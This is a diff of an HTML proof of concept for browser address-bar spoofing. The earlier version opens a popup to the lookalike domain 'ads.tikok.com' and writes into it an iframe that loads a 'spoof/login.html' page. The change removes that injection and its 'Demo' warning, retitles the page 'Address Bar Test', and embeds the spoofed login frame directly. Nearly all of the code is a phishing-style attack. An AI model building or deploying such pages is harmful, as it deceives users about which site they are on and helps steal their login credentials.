@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Address Bar Spoofing PoC</title>
+<title>Address Bar Test</title>
 
 <style>
 body {
@@ -11,13 +11,13 @@ body {
     margin-top: 60px;
 }
 
-.note {
-    color: red;
-    font-size: 14px;
-    margin-bottom: 15px;
+button {
+    padding: 12px 25px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-bottom: 30px;
 }
 
-/* Rectangle iframe (16:9 ratio) */
 .iframe-container {
     width: 80%;
     max-width: 900px;
@@ -26,14 +26,9 @@ body {
 
 iframe {
     width: 100%;
-    height: 500px;   /* persegi panjang */
+    height: 500px;   /* Persegi panjang */
     border: 1px solid #ccc;
     border-radius: 8px;
-}
-button {
-    padding: 10px 20px;
-    font-size: 16px;
-    cursor: pointer;
 }
 </style>
 
@@ -42,38 +37,21 @@ function go() {
     var win = window.open('https://ads.tikok.com:9090');
 
     if (!win) {
-        alert("Please tap again.");
-        return;
+        alert("Popup blocked. Tap again.");
     }
-
-    setTimeout(function () {
-        try {
-            win.document.open();
-            win.document.write(`
-                <div style="text-align:center; font-family:Arial;">
-                    <p class="note">
-                        Demo: Address bar shows tiktok.com,
-                        but content below is attacker-controlled.
-                    </p>
-
-                    <div class="iframe-container">
-                        <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
-                    </div>
-                </div>
-            `);
-            win.document.close();
-        } catch (e) {
-            console.log("Blocked by browser:", e);
-        }
-    }, 3000);
 }
 </script>
 </head>
 
 <body>
 
-<h2>Address Bar Spoofing Test</h2>
+<h2>Address Bar Test</h2>
+
 <button onclick="go()">Start Test</button>
+
+<div class="iframe-container">
+    <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+</div>
 
 </body>
 </html>
